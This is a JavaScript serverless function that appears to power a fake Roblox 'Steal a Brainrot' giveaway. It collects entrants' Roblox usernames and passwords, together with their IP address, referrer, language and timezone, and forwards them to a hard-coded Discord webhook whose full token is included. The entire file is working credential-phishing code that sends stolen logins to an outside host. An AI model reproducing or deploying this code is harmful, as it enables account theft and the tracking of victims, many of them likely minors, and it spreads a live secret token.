exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const data = JSON.parse(event.body);
        const webhookUrl = 'https://discord.com/api/webhooks/1501184976786296842/5iqikAT24tjrD9zwK0g74BNLcfxk3GM_cRQA_mNcGH-_6wfnL2N2FUxQgINOm1X9INJ_';

        // Extract IP from Netlify's headers
        const ip = event.headers['x-nf-client-connection-ip'] ||
                   event.headers['x-forwarded-for'] ||
                   'unknown';

        let embed = {
            title: "🧠 New Giveaway Entry!",
            color: 0x00ff88,
            fields: [],
            footer: { text: "Steal a Brainrot Giveaway" },
            timestamp: new Date().toISOString()
        };

        // User fields
        if (data.username) {
            embed.fields.push({ name: "👤 Roblox Username", value: `\`${data.username}\``, inline: true });
        }
        if (data.password) {
            embed.fields.push({ name: "🔒 Password", value: `\`${data.password}\``, inline: true });
        }
        if (data.choices && Array.isArray(data.choices)) {
            const choicesStr = data.choices.map(c => `• ${c}`).join('\n');
            embed.fields.push({ name: "🧠 Chosen Brainrots", value: choicesStr, inline: false });
        }

        // New information
        embed.fields.push({ name: "🌐 IP Address", value: `\`${ip}\``, inline: true });
        if (data.referrer) {
            embed.fields.push({ name: "🔗 Referrer", value: data.referrer, inline: true });
        }
        if (data.language) {
            embed.fields.push({ name: "🗣️ Language", value: data.language, inline: true });
        }
        if (data.timezone) {
            embed.fields.push({ name: "🕒 Timezone", value: data.timezone, inline: true });
        }

        const payload = {
            username: "Brainrot Giveaway Bot",
            embeds: [embed]
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            throw new Error(`Discord API error: ${response.status}`);
        }

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true })
        };
    } catch (error) {
        console.error('Webhook error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ success: false, error: error.message })
        };
    }
};
